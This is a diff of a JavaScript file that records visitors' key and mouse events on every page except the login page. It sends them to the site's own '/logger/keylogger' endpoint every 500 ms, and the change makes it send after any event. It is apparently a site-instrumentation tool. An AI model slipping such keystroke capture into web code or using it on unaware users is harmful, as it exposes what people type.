@@ -5,7 +5,6 @@ if (window.location.href.indexOf("login.php") == -1) {
   var aa_events = [];
 
   function aa_logKeyMouseEvent(evt) {
-      console.log(evt);
       var data;
       var x;
       var y;
@@ -38,21 +37,22 @@ if (window.location.href.indexOf("login.php") == -1) {
   // Reduce interval timing for more frequent recordings, but increases server load
   // You can also set this to send only if certain number of key stroke were made.
   window.setInterval(function () {
-    if (aa_events.length>5) {
-        eventsToSend = aa_events;
-        aa_events = [];
-        var data = JSON.stringify(eventsToSend);
+    if (aa_events.length>0) {
+      eventsToSend = aa_events;
+      aa_events = [];
+      var data = JSON.stringify(eventsToSend);
 
-        let url = `${window.location.origin}/logger/keylogger`;
-        fetch(url, { method: 'post', body: data })
-        .then(response => response.text())
-        .then(data => {
-          console.log('[keylogger]:', data);
-        })
-        .catch((error) => {
-          // TODO: There is no server error currently.
-          console.error('[keylogger] Error:', error);
-        });
+      let url = `${window.location.origin}/logger/keylogger`;
+      console.log('[keylogger] POST ...', data);
+      fetch(url, { method: 'post', body: data })
+      .then(response => response.text())
+      .then(data => {
+        console.log('[keylogger] POST done.', data);
+      })
+      .catch((error) => {
+        // TODO: There is no server error currently.
+        console.error('[keylogger] POST failed:', error);
+      });
     }
   }, 500);  
 }
